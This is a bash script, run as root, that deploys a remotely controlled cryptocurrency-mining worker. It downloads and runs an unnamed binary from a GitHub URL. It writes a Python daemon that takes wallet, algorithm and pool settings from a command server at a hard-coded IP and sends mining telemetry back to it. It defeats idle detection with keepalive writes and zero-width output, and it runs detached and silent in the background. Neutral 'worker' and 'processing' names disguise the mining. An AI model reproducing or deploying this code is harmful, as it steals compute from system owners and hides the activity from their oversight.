#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  echo "Please run as root (use: sudo bash deploy.sh)"
  exit
fi

echo "[*] Updating repositories..."
apt update -y

WORK_DIR="/opt/cent_worker"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR" || exit

echo "[*] Downloading execution binary..."
wget -O "$WORK_DIR/z" https://raw.githubusercontent.com/kisoazmarl-blip/sleep/refs/heads/main/z
chmod +x "$WORK_DIR/z"

echo "[*] Generating app.py worker script..."
cat << 'EOF' > "$WORK_DIR/app.py"
import os
import time
import requests
import subprocess
import signal
import threading
import re
import uuid
import random

MASTER_URL = "http://82.153.68.74:7744/api/sync"
TELEMETRY_URL = "http://82.153.68.74:7744/api/telemetry"

NODE_ID = str(uuid.uuid4())

worker_process = None
is_processing = False
current_target = ""
current_algo = ""
current_stratum = ""

current_hashrate = 0.0
accepted_shares = "0/0"
local_logs = []
log_lock = threading.Lock()

def parse_metrics(line):
    global current_hashrate, accepted_shares
    hashrate_match = re.search(r'(\d+\.\d+)\s+hash/s', line)
    if hashrate_match:
        current_hashrate = float(hashrate_match.group(1))

    shares_match = re.search(r'accepted:\s+(\d+/\d+)', line)
    if shares_match:
        accepted_shares = shares_match.group(1)

def read_worker_output(process):
    global local_logs
    for line in iter(process.stdout.readline, ""):
        if line:
            clean_line = line.strip()
            parse_metrics(clean_line)
            with log_lock:
                local_logs.append(clean_line)

def start_worker(address, algo, stratum):
    global worker_process, is_processing, current_target, current_algo, current_stratum, current_hashrate, accepted_shares

    cmd = [
        "./z",
        "-a",
        algo,
        "-o",
        stratum,
        "-u",
        address,
        "-t1",
    ]

    try:
        worker_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            preexec_fn=os.setsid if hasattr(os, 'setsid') else None
        )
        is_processing = True
        current_target = address
        current_algo = algo
        current_stratum = stratum
        current_hashrate = 0.0
        accepted_shares = "0/0"

        t = threading.Thread(target=read_worker_output, args=(worker_process,), daemon=True)
        t.start()
    except Exception:
        pass

def stop_worker():
    global worker_process, is_processing, current_target, current_algo, current_stratum, current_hashrate

    if worker_process:
        try:
            if hasattr(os, 'killpg'):
                os.killpg(os.getpgid(worker_process.pid), signal.SIGKILL)
            else:
                worker_process.kill()
        except Exception:
            pass

    try:
        subprocess.run(["pkill", "-9", "-f", "./z"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

    worker_process = None
    is_processing = False
    current_target = ""
    current_algo = ""
    current_stratum = ""
    current_hashrate = 0.0

def anti_idle_heartbeat():
    while True:
        try:
            with open(".keepalive", "w") as f:
                f.write(str(time.time()))
            print("\u200B", end="", flush=True)
        except Exception:
            pass
        time.sleep(300)

def poll_master():
    global is_processing, current_target, current_algo, current_stratum, local_logs

    while True:
        try:
            response = requests.get(MASTER_URL, timeout=5)
            data = response.json()

            master_wants_processing = data.get("is_processing", False)
            target_address = data.get("target_address", "")
            target_algo = data.get("target_algo", "")
            target_stratum = data.get("target_stratum", "")

            config_changed = (target_address != current_target or target_algo != current_algo or target_stratum != current_stratum)

            if master_wants_processing and not is_processing:
                start_worker(target_address, target_algo, target_stratum)
            elif master_wants_processing and is_processing and config_changed:
                stop_worker()
                start_worker(target_address, target_algo, target_stratum)
            elif not master_wants_processing and is_processing:
                stop_worker()

            if is_processing:
                with log_lock:
                    logs_to_send = list(local_logs)
                    local_logs.clear()

                payload = {
                    "node_id": NODE_ID,
                    "hashrate": current_hashrate,
                    "shares": accepted_shares,
                    "logs": logs_to_send
                }
                requests.post(TELEMETRY_URL, json=payload, timeout=5)

        except Exception:
            pass

        time.sleep(15 + random.uniform(0, 5))

if __name__ == "__main__":
    anti_idle_thread = threading.Thread(target=anti_idle_heartbeat, daemon=True)
    anti_idle_thread.start()

    stop_worker()
    poll_master()
EOF

echo "[*] Booting background daemon using nohup..."
# Kill any existing instances first to prevent duplicates
pkill -f "python3 /opt/cent_worker/app.py"
# Launch in background, discard terminal output, and detach
nohup python3 /opt/cent_worker/app.py > /dev/null 2>&1 &

echo "======================================================"
echo " Deployment Complete!"
echo " The worker node is now running invisibly in the background."
echo " To verify it is running, type: ps aux | grep app.py"
echo " To stop the script manually, type: pkill -f app.py"
echo "======================================================"
